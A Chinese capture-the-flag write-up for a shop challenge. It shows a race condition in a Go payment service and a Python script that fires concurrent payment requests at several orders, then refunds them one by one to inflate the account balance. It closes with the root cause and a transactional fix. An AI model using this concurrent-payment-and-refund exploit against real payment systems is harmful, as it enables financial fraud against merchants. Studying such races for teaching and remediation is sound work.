# Vidar shop demo

## 题目简述

商城账号距离购买 flag 商品只差 1 枚金币，页面没有充值入口。业务包含下单、支付和退款，其中支付服务存在典型的“检查后使用”竞态：先读取用户余额，经过多次远程调用和人为加入的 500 ms 延迟后，才写回扣款结果。

## 解题过程

支付接口的关键逻辑可以简化为：

```go
userResp, _ := userRpc.UserInfo(uid)
orderResp, _ := orderRpc.Detail(oid)

if userResp.Money < orderResp.Amount {
    return errors.New("余额不足")
}
if payModel.FindOneByOid(oid) != nil {
    return errors.New("订单已创建支付")
}

newPay := Pay{
    Uid: uid,
    Oid: oid,
    Amount: orderResp.Amount,
    Status: 1,
}

time.Sleep(500 * time.Millisecond)
orderRpc.UpdatePaid(oid)
payModel.Insert(&newPay)

userResp.Money = userResp.Money - orderResp.Amount
userRpc.Update(userResp)
```

余额读取、支付记录插入和余额更新不在同一个数据库事务中，也没有对用户行加锁。假设初始余额为 100，同时为同一用户的多个不同订单发送支付请求：

1. 每个请求都在其他请求写回前读到余额 100；
2. 每个请求分别通过余额检查和“订单未支付”检查；
3. 所有订单都被标记为已支付；
4. 每个请求都按自己最初读取的 100 计算新余额并覆盖写回。

因此多笔支付虽然全部成功，账户余额却只体现最后一次覆盖写入，而不是所有金额之和。

先通过正常页面创建多笔廉价商品订单，记录不同的订单 ID。下面的脚本用屏障让请求尽量同时到达；`TOKEN`、`UID`、订单 ID 和请求字段需替换为当前实例的实际值。

```python
import threading
from concurrent.futures import ThreadPoolExecutor

import requests

BASE_URL = "http://example.invalid"
TOKEN = "replace-with-current-bearer-token"
UID = 1
ORDER_IDS = [7, 8, 9, 10]

barrier = threading.Barrier(len(ORDER_IDS))

def pay(order_id):
    barrier.wait()
    response = requests.post(
        f"{BASE_URL}/api/pay/create",
        headers={"Authorization": f"bearer {TOKEN}"},
        json={"uid": UID, "oid": order_id, "amount": 5},
        timeout=10,
    )
    return order_id, response.status_code, response.text

with ThreadPoolExecutor(max_workers=len(ORDER_IDS)) as executor:
    for result in executor.map(pay, ORDER_IDS):
        print(result)
```

确认多笔支付均成功而余额只被扣除一次后，再从页面按正常流程逐笔取消或退款这些已支付订单。退款会为每一笔订单分别返还金额，于是余额逐次增加。重复“并发支付多单、逐笔退款”的过程，累计到足以购买 flag 商品即可。

官方材料没有保存当前实例的动态 flag，因此题解保留完整竞态与获利过程，不记录失效的临时值。

## 方法总结

竞态点位于支付接口，而不是库存扣减或退款本身。根因是余额检查与写回之间跨越多个操作且没有事务、行锁或原子扣减，导致并发请求都基于同一旧余额计算。修复时应把余额校验、扣款、支付记录和订单状态更新放入同一事务，并通过条件更新或行级锁保证同一用户的扣款串行化。
